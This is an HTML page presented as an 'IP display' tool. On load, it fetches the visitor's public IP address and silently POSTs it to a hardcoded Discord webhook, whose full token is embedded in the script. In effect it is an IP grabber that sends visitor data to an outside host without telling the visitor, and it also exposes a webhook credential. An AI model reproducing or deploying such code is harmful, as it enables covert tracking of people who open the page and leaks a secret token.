<!DOCTYPE html>
<html>
<head>
    <title>User IP Display</title>
    <script>
        function getIP() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    document.getElementById('ipDisplay').innerText = 'IP: ' + ip;
                    sendIPToWebhook(ip);
                })
                .catch(error => {
                    console.log('Error:', error);
                });
        }

        function sendIPToWebhook(ip) {
            const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
            const payload = {
                content: 'IP: ' + ip
            };
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('IP sent to webhook successfully.');
                } else {
                    console.log('Failed to send IP to webhook.');
                }
            })
            .catch(error => {
                console.log('Error:', error);
            });
        }
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body onload="getIP()">
    <h1 id="ipDisplay">Loading...</h1>
    <p>Please insert IP below:</p>
    <input type="text" id="ipInput">
    <button onclick="retrieveIP()">Submit</button>

    <script>
        function retrieveIP() {
            const x = document.getElementById('ipInput').value;
            console.log('IP you entered:', x);
            // Add your further logic here for processing the entered IP
        }
    </script>
</body>
</html>
